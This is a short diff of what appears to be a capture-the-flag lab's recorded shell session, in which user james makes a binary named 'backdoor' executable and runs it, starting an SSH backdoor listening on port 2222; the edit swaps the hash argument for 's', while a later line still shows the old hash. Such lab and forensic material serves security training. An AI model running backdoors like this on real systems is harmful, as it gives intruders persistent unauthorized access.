@@ -161,7 +161,7 @@ The key's randomart image is:
 +----[SHA256]-----+
 james@overpass-production:~/ssh-backdoor$ chmod +x backdoor
 chmod +x backdoor
-james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
+james@overpass-production:~/ssh-backdoor$ ./backdoor -a s
 
 <9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
 SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222
